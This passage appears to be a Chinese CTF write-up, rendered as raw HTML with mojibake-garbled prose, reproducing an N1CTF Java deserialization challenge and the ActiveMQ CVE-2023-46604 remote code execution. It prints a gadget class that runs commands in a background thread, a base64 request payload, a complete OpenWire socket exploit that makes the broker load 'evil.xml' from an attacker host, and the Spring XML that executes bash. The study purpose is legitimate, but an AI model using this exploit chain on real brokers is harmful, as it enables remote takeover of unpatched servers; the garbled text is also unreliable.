java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°è¯•å‘½ä»¤æ‹¼æ¥</p><p>ä¸å‡ºæ„å¤–åœ°å‡ºæ„å¤–äº†ğŸ˜…ğŸ˜“</p><p>å¤§Bè€å¸ˆè¯´,PrintServiceæ˜¯ä¼šæ–°å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œè¿›è¡Œä¸€ä¸ªé‡å¤å¾ªç¯å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">RceThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(age);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Person</span>.RceThread(),</span><br><span class="line">                <span class="string">&quot;Rce&quot;</span>, <span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line">        thr.setDaemon(<span class="literal">true</span>);</span><br><span class="line">        thr.start();</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699315851001.png" alt="1699315851001"></p><p>rceæˆåŠŸ</p><p>mdæœ¬åœ°jdkæ–¹æ³•ä¸å¤ªä¸€æ ·,è°ƒä¸å‡ºæ¥,å€Ÿç”¨ä¸€ä¸‹å¤§Bè€å¸ˆçš„å›¾å›¾.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/image.png" alt="image"></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/aaa.png" alt="aaa"></p><h2 id="gtmdapachemq"><span id="gtmdapachemq"> gtmdapachemq</span></h2><p><a href="https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">Apache ActiveMQ (ç‰ˆæœ¬ &lt; 5.18.3) RCE åˆ†æ - X1r0z Blog (exp10it.cn)</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17812062.html">CVE-2023-46604 activemq&lt;5.18.3 RCE åˆ†æ - KingBridge - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="ç¯å¢ƒæ­å»º"><span id="ç¯å¢ƒæ­å»º"> ç¯å¢ƒæ­å»º</span></h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> apache/activemq-classic:<span class="number">5.17</span>.<span class="number">5</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install wget curl netcat -y</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">61616</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5005</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;tail&quot;</span>,<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;/dev/null&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸å¤šè¯´äº†,5005ç”¨äºdebugç”¨,</p><p>æ‰¾åˆ°<code>/opt/apache-activemq/bin/linux-x86-64/wrapper.conf</code></p><p>åŠ ä¸Šä¸€å¥</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper.java.additional.<span class="number">14</span>=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:<span class="number">5005</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/apache-activemq/bin/linux-x86-<span class="number">64</span>/activemq console</span><br></pre></td></tr></table></figure><p>ğŸ‘´å…ˆæŠŠexpæ”¾è¿™,æ¥ç€è·Ÿç€ğŸ‘´åˆ†æè¿™æ€ä¹ˆä¸ªäº‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.Data;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScratchExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61616</span>);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line">        dos.writeInt(<span class="number">0</span>);<span class="comment">// size</span></span><br><span class="line">        dos.writeByte(<span class="number">31</span>);<span class="comment">// type</span></span><br><span class="line">        dos.writeInt(<span class="number">0</span>);<span class="comment">// CommandId</span></span><br><span class="line">        dos.writeBoolean(<span class="literal">false</span>);<span class="comment">// Command response required</span></span><br><span class="line">        dos.writeInt(<span class="number">0</span>);<span class="comment">// CorrelationId</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// body</span></span><br><span class="line">        dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// UTF</span></span><br><span class="line">        dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        dos.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">        dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        dos.writeUTF(<span class="string">&quot;http://192.168.111.1:8888/evil.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dos.close();</span><br><span class="line">        os.close();</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">  &lt;bean id=<span class="string">&quot;pb&quot;</span> class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> init-method=<span class="string">&quot;start&quot;</span>&gt;</span><br><span class="line">    &lt;constructor-arg&gt;</span><br><span class="line">      &lt;list&gt;</span><br><span class="line">        &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">        &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">        &lt;value&gt;&lt;![CDATA[touch /tmp/pwned]]&gt;&lt;/value&gt;</span><br><span class="line">      &lt;/list&gt;</span><br><span class="line">    &lt;/constructor-arg&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>èµ·ä¸ªpythonçš„httpæœåŠ¡,åˆ«è·ŸğŸ‘´è¯´ä½ ä¸ä¼šå“¦.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699352346466.png" alt="1699352346466"></p><h2 id="æµç¨‹åˆ†æ"><span id="æµç¨‹åˆ†æ"> æµç¨‹åˆ†æ</span></h2><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699342204975.png" alt="1699342204975"></p><p>ã“ã“ã¯æ–­ç‚¹ğŸ˜¤</p><p>åœ¨è¿™é‡Œä¼šè¿›è¡Œä»»æ„ç±»çš„æœ‰å‚å®ä¾‹åŒ–ï¼Œè€ŒApacheMQæ˜¯åŸºäºspringçš„ï¼Œæ‰€ä»¥è‡ªç„¶ä¼šæœ‰<code>ClassPathXmlApplicationContext</code>è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬è®©ä»–è¿›è¡Œå®ä¾‹åŒ–ï¼Œå³å¯å®ŒæˆRCEï¼Œè¿™ä¸ªåˆ©ç”¨éœ€è¦å‡ºç½‘è®¿é—®å…¬ç½‘ipçš„æ¶æ„xmlã€‚</p><h3 id="åˆ†æå¦‚ä½•åˆ©ç”¨åˆ°createthrowable"><span id="åˆ†æå¦‚ä½•åˆ©ç”¨åˆ°createthrowable"> åˆ†æå¦‚ä½•åˆ©ç”¨åˆ°createThrowableğŸ˜Š</span></h3><h4 id="java-message-servicejms"><span id="java-message-servicejms"> Java Message Service(JMS)</span></h4><p>ğŸ‘´ä¹Ÿä¸æ˜¯å¾ˆæ‡‚æ˜¯å•¥ç©æ„,åæ­£è·ŸæœåŠ¡æœ‰å…³å—,ç®€å•æŠ„ä¸€ä¸‹æ¦‚å¿µæ”¾ä¸ŠğŸ˜’ğŸ¤£</p><p>Java Message Serviceï¼ˆJMSï¼‰æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œç®¡ç†æ¶ˆæ¯çš„Java APIï¼Œé€šå¸¸ç”¨äºæ„å»ºåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºã€‚JMSæ˜¯Java EEï¼ˆEnterprise Editionï¼‰è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæä¾›äº†ä¸€ç§æ ‡å‡†çš„æ–¹æ³•æ¥å®ç°å¼‚æ­¥é€šä¿¡ï¼Œä½¿ä¸åŒç»„ä»¶ã€åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿèƒ½å¤Ÿå¯é åœ°äº¤æ¢æ¶ˆæ¯ã€‚</p><p>æ¦‚å¿µ:</p><ol><li><strong>æ¶ˆæ¯ï¼ˆMessageï¼‰</strong>ï¼šJMSæ¶ˆæ¯æ˜¯ä¸€ç§ç”¨äºåœ¨åº”ç”¨ç¨‹åºä¹‹é—´ä¼ é€’ä¿¡æ¯çš„æ•°æ®åŒ…ã€‚æ¶ˆæ¯å¯ä»¥åŒ…å«æ–‡æœ¬ã€å­—èŠ‚ã€Mapã€å¯¹è±¡ç­‰ä¸åŒç±»å‹çš„æ•°æ®ã€‚</li><li><strong>æ¶ˆæ¯ç”Ÿäº§è€…ï¼ˆMessage Producerï¼‰</strong>ï¼šæ¶ˆæ¯ç”Ÿäº§è€…æ˜¯è´Ÿè´£åˆ›å»ºå’Œå‘é€æ¶ˆæ¯çš„åº”ç”¨ç¨‹åºç»„ä»¶ã€‚å®ƒå°†æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—æˆ–ä¸»é¢˜ã€‚</li><li><strong>æ¶ˆæ¯æ¶ˆè´¹è€…ï¼ˆMessage Consumerï¼‰</strong>ï¼šæ¶ˆæ¯æ¶ˆè´¹è€…æ˜¯è´Ÿè´£æ¥æ”¶å’Œå¤„ç†æ¶ˆæ¯çš„åº”ç”¨ç¨‹åºç»„ä»¶ã€‚å®ƒè®¢é˜…ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æˆ–ä¸»é¢˜ï¼Œä»¥æ¥æ”¶å‘é€åˆ°è¯¥é˜Ÿåˆ—æˆ–ä¸»é¢˜çš„æ¶ˆæ¯ã€‚</li><li><strong>æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆQueueï¼‰</strong>ï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä¸€ç§ç‚¹å¯¹ç‚¹ï¼ˆPoint-to-Pointï¼‰é€šä¿¡æ¨¡å‹ï¼Œå…¶ä¸­æ¶ˆæ¯ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°ç‰¹å®šé˜Ÿåˆ—ï¼Œè€Œæ¶ˆæ¯æ¶ˆè´¹è€…ä»é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ã€‚æ¯æ¡æ¶ˆæ¯åªèƒ½è¢«ä¸€ä¸ªæ¶ˆè´¹è€…æ¥æ”¶ã€‚</li><li><strong>ä¸»é¢˜ï¼ˆTopicï¼‰</strong>ï¼šä¸»é¢˜æ˜¯ä¸€ç§å‘å¸ƒ/è®¢é˜…ï¼ˆPublish/Subscribeï¼‰é€šä¿¡æ¨¡å‹ï¼Œå…¶ä¸­æ¶ˆæ¯ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°ä¸»é¢˜ï¼Œè€Œæ‰€æœ‰è®¢é˜…äº†è¯¥ä¸»é¢˜çš„æ¶ˆæ¯æ¶ˆè´¹è€…éƒ½ä¼šæ¥æ”¶è¯¥æ¶ˆæ¯ã€‚</li><li><strong>è¿æ¥å·¥å‚ï¼ˆConnection Factoryï¼‰</strong>ï¼šè¿æ¥å·¥å‚æ˜¯ç”¨äºåˆ›å»ºJMSè¿æ¥çš„å·¥å‚å¯¹è±¡ã€‚è¿æ¥æ˜¯ä¸æ¶ˆæ¯ä»£ç†ï¼ˆå¦‚æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨ï¼‰çš„è¿æ¥ï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¼šè¯å’Œæ¶ˆæ¯çš„ä¼ é€’ã€‚</li><li><strong>ä¼šè¯ï¼ˆSessionï¼‰</strong>ï¼šä¼šè¯æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œç”¨äºå‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚å®ƒæä¾›äº†äº‹åŠ¡æ€§å’Œéäº‹åŠ¡æ€§ä¼šè¯é€‰é¡¹ï¼Œä»¥ç¡®ä¿æ¶ˆæ¯çš„å¯é ä¼ é€’ã€‚</li><li><strong>æ¶ˆæ¯ä»£ç†ï¼ˆMessage Brokerï¼‰</strong>ï¼šæ¶ˆæ¯ä»£ç†æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ç»„ä»¶ï¼Œè´Ÿè´£æ¥æ”¶ã€å­˜å‚¨å’Œè·¯ç”±æ¶ˆæ¯ã€‚å¸¸è§çš„JMSæ¶ˆæ¯ä»£ç†åŒ…æ‹¬Apache ActiveMQã€RabbitMQå’ŒIBM WebSphere MQç­‰ã€‚</li></ol><p>åœ¨JMSä¸­ï¼Œproducer clientå’Œconsumer clientå¼‚æ­¥åœ°å‘brokerå»ºç«‹è¿æ¥ã€‚Queueæ˜¯å¯æ¶ˆè€—æ€§çš„ï¼Œtopicæ˜¯æ— é™çš„ã€‚ğŸ˜…</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/Oz9gyljXa5Cb3oE.png" alt="Oz9gyljXa5Cb3oE"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">        connection.start();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;tempQueue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">        <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        producer.send(message);</span><br><span class="line"></span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›é€ è¿æ¥,æ‰“æœ¬åœ°çš„616ç«¯å£æœåŠ¡,é‡ç‚¹åœ¨<code>Destination destination = session.createQueue(&quot;tempQueue&quot;);</code>ï¼šåˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚è¿™é‡Œä½¿ç”¨<code>createQueue()</code>æ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ªåä¸º&quot;tempQueue&quot;çš„é˜Ÿåˆ—ã€‚è¿™æ˜¯ä¸€ä¸ªç‚¹å¯¹ç‚¹é€šä¿¡æ¨¡å‹çš„é˜Ÿåˆ—ã€‚</p><p>ä¸€èˆ¬æ¥è¯´<code>Producer</code>å°†æ¶ˆæ¯æ”¾åœ¨é˜Ÿåˆ—ä¹‹ä¸­,å…è®¸å…¶ä»–åº”ç”¨ç¨‹åºæˆ–ç»„ä»¶ä»è¯¥é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯.</p><p>activemqçš„brokerå’Œclientç”¨OpenWireåº”ç”¨å±‚åè®®é€šä¿¡ï¼Œä¼ è¾“å±‚ç”¨çš„æ˜¯TCPåè®®ã€‚</p><p>OpenWireé€šä¿¡çš„åŒ…ä¼šåœ¨<code>org.apache.activemq.openwire#doUnmarshal</code>ååºåˆ—åŒ–</p><p>OpenWireï¼ˆä¹Ÿç§°ä¸ºActiveMQ OpenWireï¼‰æ˜¯Apache ActiveMQæ¶ˆæ¯ä»£ç†çš„äºŒè¿›åˆ¶åè®®ï¼Œç”¨äºåœ¨æ¶ˆæ¯ä»£ç†å’ŒJMSå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚å®ƒæ˜¯ä¸€ç§ç´§å‡‘çš„ã€é«˜æ•ˆçš„åè®®ï¼Œæ—¨åœ¨æä¾›å¿«é€Ÿçš„æ¶ˆæ¯ä¼ é€’æ€§èƒ½ã€‚ğŸ‘´ç®€å•è¯´åˆ°è¿™,ä¸æƒ³é•¿ç¯‡å¤§å¹…å†™äº†( à° àµ à°  )ï¾‰</p><p>ä¸Štndæ–­ç‚¹</p><p>![1699354951791](./assets/1699354951791.png<img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699355535137.png" alt="1699355535137"></p><p>é˜¿ç±³è¯ºæ–¯,æéº»éº»åœ°æŠ¥é”™<img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699355169986.png" alt="1699355169986"></p><p>å“¦,æºèµ–æ°æ²¡æœ‰è¿™ä¸ªç±»,ntmdä¸æ—©è¯´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.17</span><span class="number">.1</span>&lt;/version&gt; &lt;!-- 